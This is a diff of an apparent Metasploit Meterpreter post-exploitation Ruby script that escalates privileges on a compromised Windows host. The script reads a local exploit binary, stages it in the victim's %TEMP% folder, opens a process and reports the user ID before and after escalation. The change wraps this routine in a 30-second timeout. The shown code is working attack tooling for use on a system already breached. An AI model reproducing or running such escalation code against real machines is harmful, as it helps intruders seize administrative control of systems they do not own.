@@ -25,12 +25,11 @@ opts.parse(args) do |opt, idx, val|
         end
 end
 
-
-if client.platform =~ /win32/
+def run_exploit
+    if client.platform =~ /win32/
         # Handle exceptions in the getuid() call
         begin
-                print_status("Currently running as " + client.sys.config.getuid)
-                print_line("")
+            print_status("Currently running as " + client.sys.config.getuid)
         rescue ::Rex::Post::Meterpreter::RequestError
         end
 
@@ -40,7 +39,7 @@ if client.platform =~ /win32/
 
         expdata = ""
         ::File.open(exp, "rb") do |fd|
-                expdata = fd.read(fd.stat.size)
+            expdata = fd.read(fd.stat.size)
         end
 
         tempdir = client.fs.file.expand_path("%TEMP%")
@@ -53,8 +52,7 @@ if client.platform =~ /win32/
         server = client.sys.process.open
 
         print_status("Escalating our process (PID:#{server.pid})...")
-        print_status("Press ^C if it hangs, then getuid to see if it worked...")
-        print_line("")
+        print_status("Waiting 30 seconds before interrupt...")
 
         tempdrive = tempdir.split(':')[0]
 
@@ -67,10 +65,20 @@ if client.platform =~ /win32/
 
         # Handle exceptions in the getuid() call
         begin
-                print_status("Now running as " + client.sys.config.getuid)
+            print_status("Now running as " + client.sys.config.getuid)
         rescue ::Rex::Post::Meterpreter::RequestError
         end
-else
+    else
         print_error("This version of Meterpreter is not supported with this Script!")
         raise Rex::Script::Completed
+    end
+end
+
+begin
+    ::Timeout.timeout(30) do
+        run_exploit
+    end
+rescue Timeout::Error
+    print_status("No response, interrupting now, but please check uid")
+    raise Interrupt
 end
